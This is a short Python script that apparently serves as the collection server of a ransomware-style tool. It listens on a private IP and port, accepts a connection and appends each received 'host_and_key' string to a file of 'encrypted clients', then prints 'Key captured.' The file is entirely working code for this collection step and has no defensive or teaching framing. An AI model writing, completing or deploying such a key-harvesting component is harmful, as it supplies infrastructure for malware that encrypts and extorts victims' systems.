import socket

IP_ADDRESS = '10.0.0.161'
PORT = 6000

print("Creating Socket")
with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
    s.bind((IP_ADDRESS,PORT))
    print("Listening for connections...")
    s.listen(1)
    conn, addr = s.accept()
    print(f"Incoming connection from {addr}")
    with conn:
        while True:
            host_and_key = conn.recv(1024).decode()
            with open("encripted_clients.txt", 'a') as f:
                f.write(host_and_key+ "\n" )
            break
        print("Key captured.")